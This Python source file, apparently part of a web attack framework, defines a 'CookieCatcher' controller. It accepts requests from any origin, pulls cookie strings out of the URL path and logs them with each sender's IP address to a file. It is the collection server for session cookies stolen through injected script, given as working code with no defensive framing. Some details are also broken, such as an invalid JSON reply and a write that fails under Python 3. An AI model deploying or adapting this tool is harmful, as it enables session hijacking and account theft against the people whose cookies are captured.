
import sys
import os.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))

from ctrl import Controller 
import builtins

class CookieCatcher(Controller):
	name = "CookieCatcher";
	def __init__(self, server):
		Controller.__init__(self, server)
		self.base = builtins.CFG.get(self.name, "servbase")
		self.logfile = os.path.join(
			builtins.CFG.get("global","basepath"),
			builtins.CFG.get(self.name,"logfile")
		)


	def cookie2dict(self, c):
		ret = []
		cookies = c.split("&")
		for cookie in cookies:
			r = cookie.split("=")
			ret.append( {"name": r[0], "value": r[1]} )
		return ret


	def cookie2log(self, cookie):
		with open(self.logfile, "a+") as f:
			f.write(cookie + "\n")

	def action(self):
		self.server.send_response(200)
		self.server.send_header('Access-Control-Allow-Origin', '*')
		self.server.send_header('Content-type', 'application/json')
		self.server.end_headers()
		self.server.wfile.write("{status:'OK'}\n")
		cookies = self.server.path[len(self.base)+1:]
		self.cookie2log(self.server.client_address[0] + ": " + cookies)

	def get_routes(self):
		ret = [];
		ret.append({'regexp': r'^' + self.base + '\?', 'controller': 'CookieCatcher', 'action': 'action'});
		return ret;


